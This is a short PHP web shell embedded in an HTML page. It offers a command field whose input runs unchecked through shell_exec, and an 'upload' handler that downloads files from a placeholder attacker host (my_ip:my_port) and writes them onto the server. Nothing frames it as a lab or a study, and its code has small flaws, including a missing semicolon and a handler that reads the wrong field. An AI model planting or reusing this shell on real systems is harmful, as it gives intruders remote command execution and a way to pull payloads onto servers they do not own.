<html>
<body>

<form action="" method="POST" enctype="multipart/form-data">
	<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
	<p> File: <input type="file" name="fileToUpload" id="fileToUpload">
    	<input type="submit" value="Upload" name="upload">
</form>
	
<br>
	
<form method="GET">
	<p>CMD: <input type="text" name="command">
    	<input type="submit" value="Exec" name="cmd">
</form>

<pre>
<?
	$host = "my_ip";
	$port = "my_port"
	if ($_POST['upload']) {
		file_put_contents($_POST['upload'], file_get_contents("http://$host:$port/" . $_POST['upload']));
	};
	if ($_GET['cmd']) {
	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
	};
?>
</pre>
</body>
</html>
